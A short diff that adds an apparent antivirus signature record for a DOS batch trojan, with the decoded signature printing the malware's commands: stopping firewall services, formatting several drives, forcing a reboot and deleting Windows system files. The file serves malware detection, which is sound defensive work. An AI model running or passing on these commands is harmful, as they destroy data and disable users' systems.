@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36661
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off net stop alg /y @net stop sharedaccess format d:/q /y format e:/q /y format f:/q /y format g:/q /y shutdown -r -t 0 cd c:\ cd windows del *.* /q cd system32 del *.* /q del %0 
